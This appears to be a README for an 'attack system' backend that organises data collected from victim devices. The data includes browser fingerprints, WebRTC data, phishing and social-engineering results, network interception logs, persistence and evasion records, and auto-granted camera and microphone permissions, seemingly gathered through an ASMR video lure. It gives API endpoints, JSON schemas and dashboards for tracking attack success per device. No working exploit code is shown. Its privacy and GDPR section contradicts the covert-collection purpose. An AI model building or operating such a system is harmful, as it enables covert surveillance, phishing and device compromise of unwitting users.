# 📱 **Device-Based Data Organization System**

## **Overview**

The attack system now organizes all data by **device ID**, creating separate collections and file structures for each device. This provides better data isolation, easier analysis, and improved scalability.

## **Database Structure**

### **Device Collection**
```
Device Collection:
┌─────────────┬─────────────┐
│ _id         │ device      │
├─────────────┼─────────────┤
│ 12213       │ abc         │
│ 2345        │ xyz         │
│ 6543        │ wsd         │
└─────────────┴─────────────┘
```

### **Per-Device Collections**
Each device has its own collections:

```
Device: abc
├── Sessions
├── DataCapture
├── AttackLog
├── PermissionLog
└── Video

Device: xyz
├── Sessions
├── DataCapture
├── AttackLog
├── PermissionLog
└── Video

Device: wsd
├── Sessions
├── DataCapture
├── AttackLog
├── PermissionLog
└── Video
```

## **File Structure**

### **Base Directory Structure**
```
data/
├── devices/
│   ├── abc/
│   │   ├── device_info.json
│   │   ├── data/
│   │   ├── sessions/
│   │   ├── attacks/
│   │   ├── permissions/
│   │   ├── fingerprints/
│   │   ├── behavioral/
│   │   ├── network/
│   │   ├── storage/
│   │   ├── ml/
│   │   └── evasion/
│   ├── xyz/
│   │   └── [same structure]
│   └── wsd/
│       └── [same structure]
├── videos/
│   ├── devices/
│   │   ├── abc/
│   │   ├── xyz/
│   │   └── wsd/
├── logs/
│   └── devices/
└── backup/
    └── devices/
```

## **Data Types by Device**

### **1. Device Information**
- Device ID and metadata
- Browser fingerprint
- Hardware information
- Status and timestamps

### **2. Session Data**
- Session ID and duration
- IP address and user agent
- Start/end times
- Data points collected

### **3. Data Capture**
- Browser fingerprinting
- Device information
- Network behavior
- Behavioral patterns
- Timing analysis
- Storage data
- WebRTC data

### **4. Attack Logs**
- Social engineering attempts
- Network attacks
- Persistence mechanisms
- Evasion techniques
- ML analysis results

### **5. Permission Logs**
- Permission requests
- Auto-granted permissions
- User interactions
- Success/failure rates

### **6. Video Data**
- ASMR video metadata
- Download information
- Categories and tags
- File paths and sizes

## **API Endpoints**

### **Device Management**
```javascript
// Get all devices
GET /api/devices

// Get device stats
GET /api/device/:deviceId/stats

// Get device data
GET /api/device/:deviceId/data?type=attacks&limit=100
```

### **Data Capture**
```javascript
// Capture data for device
POST /api/capture
{
  "deviceId": "abc",
  "type": "browser_fingerprint",
  "category": "fingerprinting",
  "data": { ... }
}
```

### **Permission Handling**
```javascript
// Log auto-granted permission
POST /api/permissions/auto-granted
{
  "deviceId": "abc",
  "permission": "camera",
  "success": true
}

// Log permission change
POST /api/permissions/change
{
  "deviceId": "abc",
  "permission": "microphone",
  "action": "granted",
  "method": "user_interaction"
}
```

### **Attack Logging**
```javascript
// Log social engineering
POST /api/social-engineering/phishing
{
  "deviceId": "abc",
  "success": true,
  "technique": "urgency"
}

// Log network attack
POST /api/network/interception
{
  "deviceId": "abc",
  "success": false,
  "payload": { ... }
}
```

## **Usage Examples**

### **1. View All Devices**
```bash
# Command line
node device_data_viewer.js

# Web interface
http://localhost:3000/device_dashboard.html
```

### **2. Get Device Statistics**
```javascript
const response = await fetch('/api/device/abc/stats');
const stats = await response.json();
console.log(stats);
```

### **3. View Device Data**
```javascript
// Get attack data for device
const response = await fetch('/api/device/abc/data?type=attacks&limit=50');
const attacks = await response.json();
console.log(attacks);
```

### **4. Monitor Real-time Activity**
```javascript
// WebSocket connection for real-time updates
const ws = new WebSocket('ws://localhost:3000');
ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  if (data.deviceId === 'abc') {
    console.log('Device abc activity:', data);
  }
};
```

## **Benefits**

### **1. Data Isolation**
- Each device's data is completely separate
- No cross-contamination between devices
- Easier to manage and analyze

### **2. Scalability**
- Can handle thousands of devices
- Efficient storage and retrieval
- Better performance with large datasets

### **3. Analysis**
- Easy to compare devices
- Track individual device behavior
- Identify patterns and anomalies

### **4. Security**
- Device-specific access controls
- Isolated data breaches
- Better audit trails

### **5. Maintenance**
- Easy to backup individual devices
- Simple cleanup and archiving
- Device-specific troubleshooting

## **File Formats**

### **Device Info File**
```json
{
  "deviceId": "abc",
  "device": "abc",
  "createdAt": "2024-01-01T00:00:00.000Z",
  "lastUpdated": "2024-01-01T12:00:00.000Z",
  "status": "active",
  "totalSessions": 15,
  "totalDataPoints": 1250,
  "totalAttacks": 45,
  "totalPermissions": 23,
  "totalVideos": 8
}
```

### **Data Capture File**
```json
{
  "deviceId": "abc",
  "dataType": "browser_fingerprint",
  "timestamp": "2024-01-01T12:00:00.000Z",
  "data": {
    "userAgent": "...",
    "screenResolution": "1920x1080",
    "timezone": "America/New_York",
    "language": "en-US",
    "plugins": [...],
    "canvas": "fingerprint_hash",
    "webgl": "webgl_fingerprint"
  }
}
```

### **Attack Log File**
```json
{
  "deviceId": "abc",
  "type": "social_engineering",
  "technique": "phishing",
  "data": {
    "success": true,
    "payload": {...},
    "response": {...},
    "duration": 5000,
    "severity": "high"
  },
  "timestamp": "2024-01-01T12:00:00.000Z"
}
```

## **Tools and Utilities**

### **1. Device Data Viewer**
```bash
# Command line tool
node device_data_viewer.js
```

### **2. Web Dashboard**
```
http://localhost:3000/device_dashboard.html
```

### **3. API Documentation**
```
http://localhost:3000/api/health
http://localhost:3000/api/devices
```

## **Backup and Recovery**

### **Device-Specific Backup**
```javascript
// Backup single device
fileManager.backupDeviceData('abc');

// Backup all devices
const devices = fileManager.getAllDevices();
devices.forEach(device => {
  fileManager.backupDeviceData(device.deviceId);
});
```

### **Cleanup Old Data**
```javascript
// Clean up data older than 30 days
fileManager.cleanupOldDeviceData('abc', 30);
```

## **Monitoring and Alerts**

### **Device Activity Monitoring**
- Track device login patterns
- Monitor data collection rates
- Alert on unusual activity
- Track attack success rates

### **Performance Metrics**
- Data collection speed
- Storage usage per device
- API response times
- Error rates

## **Security Considerations**

### **Data Protection**
- Encrypt sensitive device data
- Implement access controls
- Regular security audits
- Compliance with data regulations

### **Privacy**
- Anonymize device identifiers
- Implement data retention policies
- User consent management
- GDPR compliance

## **Future Enhancements**

### **1. Real-time Analytics**
- Live device monitoring
- Predictive analysis
- Automated alerts
- Performance optimization

### **2. Advanced Visualization**
- Interactive dashboards
- Device comparison tools
- Trend analysis
- Geographic mapping

### **3. Machine Learning**
- Behavioral analysis
- Anomaly detection
- Attack prediction
- Automated responses

### **4. Integration**
- SIEM integration
- Threat intelligence feeds
- External APIs
- Third-party tools

---

**This device-based organization system provides a robust foundation for managing and analyzing attack data across multiple devices while maintaining data integrity and security.** 